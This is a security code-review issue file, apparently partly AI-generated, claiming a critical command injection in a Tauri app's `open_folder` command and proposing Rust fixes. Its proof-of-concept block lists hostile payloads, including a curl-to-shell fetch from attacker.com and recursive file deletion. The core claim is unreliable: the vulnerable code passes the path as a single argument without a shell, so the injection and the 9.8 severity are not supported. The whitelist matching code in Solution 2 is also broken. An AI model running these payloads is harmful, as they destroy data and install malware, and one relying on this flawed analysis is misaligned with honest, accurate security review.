---
status: pending
priority: p1
issue_id: "001"
tags: [code-review, security, rust, tauri]
dependencies: []
---

# Command Injection Vulnerability - Missing Path Validation

## Problem Statement

**CRITICAL SECURITY VULNERABILITY**: The `open_folder` Tauri command accepts arbitrary string input and passes it directly to system commands without validation or sanitization. This creates a command injection attack vector that could allow arbitrary code execution.

**Location**: `frontend/src-tauri/src/commands.rs:5-28`

**Why It Matters**: An attacker could exploit this to execute arbitrary commands with the privileges of the Tauri application, leading to complete system compromise, data exfiltration, malware installation, or denial of service.

## Findings

### From Security Sentinel Agent

**CVSS Score**: 9.8 (Critical)

**Proof of Concept Exploits**:
```typescript
// macOS/Linux command injection:
await invoke('open_folder', { path: '/tmp; rm -rf ~/*' });
await invoke('open_folder', { path: '$(curl http://attacker.com/malware.sh | sh)' });
await invoke('open_folder', { path: '/tmp & whoami > /tmp/pwned.txt &' });

// Windows command injection:
await invoke('open_folder', { path: 'C:\\ & calc.exe &' });
await invoke('open_folder', { path: 'C:\\ && del /F /S /Q C:\\important\\*' });
```

**Current Vulnerable Code**:
```rust
#[tauri::command]
pub fn open_folder(path: String) -> Result<(), String> {
    #[cfg(target_os = "macos")]
    {
        Command::new("open")
            .arg(&path)  // ❌ No validation!
            .spawn()
            .map_err(|e| format!("Failed to open folder: {}", e))?;
    }
    // ... similar for Windows and Linux
    Ok(())
}
```

**Impact**:
- Arbitrary command execution with app privileges
- Complete system compromise possible
- Data exfiltration
- Malware installation
- Denial of service

## Proposed Solutions

### Solution 1: Path Validation with Canonicalization (Recommended)

**Implementation**:
```rust
use std::path::{Path, PathBuf};
use std::process::Command;

#[tauri::command]
pub fn open_folder(path: String) -> Result<(), String> {
    // 1. Validate and canonicalize the path
    let path_buf = PathBuf::from(&path);

    // 2. Verify the path exists and is a directory
    if !path_buf.exists() {
        return Err("Path does not exist".to_string());
    }

    if !path_buf.is_dir() {
        return Err("Path is not a directory".to_string());
    }

    // 3. Canonicalize to resolve symlinks and relative paths
    let canonical_path = path_buf
        .canonicalize()
        .map_err(|e| format!("Invalid path: {}", e))?;

    // 4. Convert to string - ensures no null bytes or invalid UTF-8
    let safe_path = canonical_path
        .to_str()
        .ok_or("Path contains invalid characters")?;

    // 5. Platform-specific opening with validated path
    #[cfg(target_os = "macos")]
    {
        Command::new("open")
            .arg(safe_path)
            .spawn()
            .map_err(|e| format!("Failed to open folder: {}", e))?;
    }

    #[cfg(target_os = "windows")]
    {
        Command::new("explorer")
            .arg(safe_path)
            .spawn()
            .map_err(|e| format!("Failed to open folder: {}", e))?;
    }

    #[cfg(target_os = "linux")]
    {
        Command::new("xdg-open")
            .arg(safe_path)
            .spawn()
            .map_err(|e| format!("Failed to open folder: {}", e))?;
    }

    Ok(())
}
```

**Pros**:
- Comprehensive validation prevents all known injection attacks
- Canonical paths resolve symlinks and relative paths
- UTF-8 validation prevents null byte attacks
- Existence check provides better error messages

**Cons**:
- Slightly more code complexity
- Performance overhead minimal (~0.1-0.5ms)

**Effort**: 30-45 minutes
**Risk**: Low - purely additive changes

---

### Solution 2: Whitelist Allowed Directories (Most Secure)

**Implementation**:
```rust
use std::path::{Path, PathBuf};

const ALLOWED_DIRECTORIES: &[&str] = &[
    "/Users/*/Downloads",
    "/Users/*/Documents",
    "/Users/jeffclark/projects/video-transcriber/transcripts",
];

fn is_path_allowed(path: &Path) -> bool {
    let path_str = path.to_string_lossy();
    ALLOWED_DIRECTORIES.iter().any(|pattern| {
        // Implement glob matching or prefix matching
        path_str.starts_with(pattern.replace("*", ""))
    })
}

#[tauri::command]
pub fn open_folder(path: String) -> Result<(), String> {
    let canonical_path = PathBuf::from(&path)
        .canonicalize()
        .map_err(|e| format!("Invalid path: {}", e))?;

    if !is_path_allowed(&canonical_path) {
        return Err("Access to this directory is not permitted".to_string());
    }

    // ... rest of validation and execution
}
```

**Pros**:
- Maximum security - only specific directories accessible
- Defense in depth
- Prevents accidental access to sensitive system folders

**Cons**:
- Less flexible - requires updating whitelist for new folders
- May require user configuration

**Effort**: 1-2 hours
**Risk**: Medium - may block legitimate use cases

---

### Solution 3: Input Sanitization Only (Not Recommended)

**Implementation**:
```rust
fn sanitize_path(path: &str) -> Result<String, String> {
    if path.contains(';') || path.contains('&') || path.contains('|')
        || path.contains('`') || path.contains('$') || path.contains("..") {
        return Err("Path contains invalid characters".to_string());
    }
    Ok(path.to_string())
}
```

**Pros**:
- Simple to implement
- Fast

**Cons**:
- ❌ Blacklist approach - easy to bypass
- ❌ Doesn't handle all edge cases
- ❌ Not comprehensive

**Effort**: 15 minutes
**Risk**: High - still vulnerable to clever attacks

---

## Recommended Action

**Implement Solution 1 (Path Validation with Canonicalization) immediately.**

This provides comprehensive protection without being overly restrictive. Consider adding Solution 2 (whitelist) in a future release for defense in depth.

## Technical Details

**Affected Files**:
- `frontend/src-tauri/src/commands.rs` (lines 5-28)

**Affected Components**:
- Tauri command: `open_folder`
- All three platform implementations (macOS, Windows, Linux)

**Testing Requirements**:
- Test with valid directory paths
- Test with invalid paths (should fail gracefully)
- Test with command injection attempts (should reject)
- Test with symlinks and relative paths
- Test with non-UTF-8 paths

## Acceptance Criteria

- [ ] Path existence validation implemented
- [ ] Directory type validation implemented
- [ ] Path canonicalization implemented
- [ ] UTF-8 validation implemented
- [ ] Command injection attempts rejected with clear error
- [ ] Valid paths still work correctly
- [ ] Error messages are helpful but don't leak system details
- [ ] All three platforms tested (macOS, Windows, Linux)

## Work Log

### 2026-02-13
- **Discovery**: Security review identified critical command injection vulnerability
- **Assessment**: CVSS 9.8 - allows arbitrary code execution
- **Decision**: Must fix before production deployment
- **Implementation**: Applied Solution 1 (Path Validation with Canonicalization)
  - Added PathBuf validation
  - Added existence and directory checks
  - Added path canonicalization (resolves symlinks, relative paths)
  - Added UTF-8 validation
  - Bonus: Added unsupported platform handling (issue #003)
- **Status**: ✅ Implemented, awaiting testing
- **Next**: Test with valid paths, invalid paths, and injection attempts

## Resources

- **OWASP Command Injection**: https://owasp.org/www-community/attacks/Command_Injection
- **CWE-78: OS Command Injection**: https://cwe.mitre.org/data/definitions/78.html
- **Rust std::path documentation**: https://doc.rust-lang.org/std/path/
- **Tauri Security Best Practices**: https://tauri.app/v1/guides/features/command
